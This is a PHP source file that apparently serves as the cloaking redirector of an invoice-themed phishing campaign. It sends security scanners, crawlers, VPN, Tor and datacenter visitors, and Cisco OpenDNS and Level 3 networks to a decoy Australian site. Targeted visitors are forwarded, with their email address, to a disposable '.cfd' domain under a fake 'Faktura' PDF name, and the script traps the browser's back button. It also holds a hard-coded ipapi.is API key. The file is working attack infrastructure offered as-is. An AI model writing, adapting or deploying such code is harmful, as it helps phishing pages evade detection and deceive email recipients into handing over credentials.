<?php

header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

error_reporting(0);


///////////////////////////////////////////////////
$HexLink = "web.215f8c0f7f64e18b5f9cbc1d91513b66.cfd/faktura/";
/////////////////////////////////////////////////


$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$suspicious_languages = ['*', 'q=0.5', 'q=0'];

// List of bot keywords
$bot_agents = [
    'curl', 'wget', 'bot', 'spider', 'crawler', 'googlebot', 'bingbot', 'slurp', 'yandexbot', 'botmail', 'scraper',
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'pinterest', 'slackbot', 'discordbot', 
    'embedly', 'quora link preview', 'bitlybot', 'mj12bot', 'ahrefsbot', 'semrushbot', 'sogou', 'telegrambot', 
    'searchbot', 'scooter', 'twiceler', 'spinn3r', 'python-requests', 'node.js', 'crawling', 'zoomeye', 
    'healthbot', 'facebook', 'googleusercontent', 'yahoo', 'msnbot', 'applebot', 'chrome-lighthouse', 'serpstatbot',
    'grapeshotbot', 'zyborg', 'rogerbot', 'bot/0.1', 'megaindex', 'hermit', 'crawl', 'feedfetcher', 'magpie-crawler',
    'w3c_validator', 'dotbot', 'seokicks', 'alexabot', 'linguee', 'webcollage', 'tencenttraveler', 'metaURI', 
    'ruby', 'python-urllib', 'java', 'javafx', 'serp-api', 'backlink-crawler', 'archive.org_bot', 'wordpress', 
    'googlesearch', 'baidu', 'spinn3r', 'yandeximages', 'yandexvideo', 'nginx', 'squid', 'cloudflare', 'rockerbot',
    'crawler4j', 'paros', 'botobix', 'valkyriebot', 'clicky', 'sezbot', 'pingdom', 'dataforseo', 'linkdex', 
    'commoncrawl', 'urlbot', 'panscient', 'seomoz', 'apache', 'bing-preview', 'datadome', 'semalt', 'xovi', 
    'wordpressbot', 'scrapy', 'unitybot', 'geobot', 'neocities', 'skyscannerbot', 'bunjalloo', 'searchmetrics',
    'gdebot', 'gobot', 'loadimpact', 'btbot', 'nutch', 'robozilla', 'cognitiveseo', 'majestic-12', 'mapillary', 
    'sistrix', 'plesk', 'serphunter', 'pingdom', 'calaisbot', 'pycurl', 'googletagmanager', 'robot', 'retire.js',
    'watson', 'websoul', 'sitebot', 'roverbot', 'daumoa', 'botster', 'webmeup', 'skyscraper', 'goku', 'searchbot',
    'AhrefsBot', 'DuckDuckBot', 'BaiduSpider', 'Sogou Spider', 'SeznamBot', 'ScreamingFrog', 'Exabot'
];

// Check for empty User-Agent (common for bots)
if (empty($user_agent)) {
    header("Location: https://jtbstudios.com.au/");
    exit();
}

// Check if User-Agent contains bot keywords
foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        header("Location: https://jtbstudios.com.au/");
        exit();
    }
}

// Check for missing or suspicious Accept-Language
if (empty($accept_language) || in_array($accept_language, $suspicious_languages, true)) {
    header("Location: https://jtbstudios.com.au/");
    exit();
}

// Main email handling
if (isset($_GET["email"]) && !empty($_GET["email"])) {
    $email = $_GET['email'];

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        header("Location: https://jtbstudios.com.au/");
        exit();
    }

$visitorIP = $_SERVER['REMOTE_ADDR'] ?? '';

if (!empty($visitorIP)) {

    $apiKey = '0b8ffb781ad1f1bb5b43';

    // Cache valabil 24 de ore
    $cacheTime = 86400;

    // Folder cache
    $cacheDir = __DIR__ . '/ip-cache';

    if (!is_dir($cacheDir)) {
        @mkdir($cacheDir, 0755, true);
    }

    // Fișier unic pentru fiecare IP
    $cacheFile = $cacheDir . '/' . md5($visitorIP) . '.json';

    $ipData = null;

    /*
     * 1. VERIFICĂM CACHE-UL
     */

    if (file_exists($cacheFile)) {

        $cacheAge = time() - filemtime($cacheFile);

        if ($cacheAge < $cacheTime) {

            $cachedData = @file_get_contents($cacheFile);

            if ($cachedData !== false) {
                $ipData = json_decode($cachedData, true);
            }
        }
    }

    /*
     * 2. DACĂ NU AVEM CACHE VALID,
     *    FACEM REQUEST LA API
     */

    if (!is_array($ipData)) {

        $apiURL = 'https://api.ipapi.is/?q=' . urlencode($visitorIP) .
                  '&key=' . urlencode($apiKey);

        $context = stream_context_create([
            'http' => [
                'timeout' => 3
            ]
        ]);

        $response = @file_get_contents($apiURL, false, $context);

        if ($response !== false) {

            $decodedData = json_decode($response, true);

            if (is_array($decodedData)) {

                $ipData = $decodedData;

                /*
                 * Determinăm statusul
                 */

                $isVPN        = !empty($ipData['is_vpn']);
                $isProxy      = !empty($ipData['is_proxy']);
                $isTor        = !empty($ipData['is_tor']);
                $isDatacenter = !empty($ipData['is_datacenter']);

                if ($isVPN) {
                    $ipData['_security_status'] = 'BLOCKED';
                    $ipData['_security_reason'] = 'VPN';
                }
                elseif ($isProxy) {
                    $ipData['_security_status'] = 'BLOCKED';
                    $ipData['_security_reason'] = 'PROXY';
                }
                elseif ($isTor) {
                    $ipData['_security_status'] = 'BLOCKED';
                    $ipData['_security_reason'] = 'TOR';
                }
                elseif ($isDatacenter) {
                    $ipData['_security_status'] = 'BLOCKED';
                    $ipData['_security_reason'] = 'DATACENTER';
                }
                else {
                    $ipData['_security_status'] = 'ALLOWED';
                    $ipData['_security_reason'] = 'NORMAL';
                }

                $ipData['_checked_at'] = date('Y-m-d H:i:s');

                /*
                 * Salvăm rezultatul
                 */

                @file_put_contents(
                    $cacheFile,
                    json_encode($ipData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
                    LOCK_EX
                );
            }
        }
    }

/*
 * 3. VERIFICĂM STATUSUL
 */

if (is_array($ipData)) {

    /*
     * ==========================================================
     * VERIFICĂM ASN / PROVIDER
     * ==========================================================
     */

    $asnNumber = 0;

    if (isset($ipData['asn']) && is_array($ipData['asn'])) {
        $asnNumber = (int)($ipData['asn']['asn'] ?? 0);
    }


    /*
     * ==========================================================
     * CISCO OPENDNS - ASN 36692
     * ==========================================================
     */

    if ($asnNumber === 36692) {

        $ipData['_security_status'] = 'BLOCKED';
        $ipData['_security_reason'] = 'CISCO_OPENDNS';

        @file_put_contents(
            $cacheFile,
            json_encode(
                $ipData,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            ),
            LOCK_EX
        );

        header("Location: https://jtbstudios.com.au");
        exit();
    }


    /*
     * ==========================================================
     * LEVEL 3 PARENT, LLC - ASN 3356
     * ==========================================================
     */

    if ($asnNumber === 3356) {

        $ipData['_security_status'] = 'BLOCKED';
        $ipData['_security_reason'] = 'LEVEL3_ASN_3356';

        @file_put_contents(
            $cacheFile,
            json_encode(
                $ipData,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            ),
            LOCK_EX
        );

        header("Location: https://jtbstudios.com.au");
        exit();
    }


    /*
     * ==========================================================
     * VERIFICAREA STATUSULUI EXISTENT
     * ==========================================================
     */

    $status = $ipData['_security_status'] ?? 'ALLOWED';

    if ($status === 'BLOCKED') {

        header("Location: https://jtbstudios.com.au");
        exit();
    }
}


/*
 * ==============================================================
 * DACĂ API-UL NU FUNCȚIONEAZĂ SAU QUOTA ESTE EPUIZATĂ
 *
 * Utilizatorul este lăsat să treacă.
 * ==============================================================
 */

}

        $Link = "https://$HexLink/?email=" . urlencode($email) . "&factura=Faktura_0000005079.pdf";
        $jsRedirect = "$Link";
        $noJsRedirect = "https://jtbstudios.com.au/";

        echo <<<HTML
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="utf-8">

        <noscript>
            <meta http-equiv="refresh" content="0; url={$noJsRedirect}">
        </noscript>

        <script>
            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                history.pushState(null, null, location.href);
            };
            window.onbeforeunload = function () {
                window.location.replace(location.href);
            };

            // MAIN JS redirect
            location.replace("{$jsRedirect}");
        </script>

        </head>
        <body>
        </body>
        </html>
        HTML;

        exit();

} else {
header("Location: https://jtbstudios.com.au/");
exit();
}

?>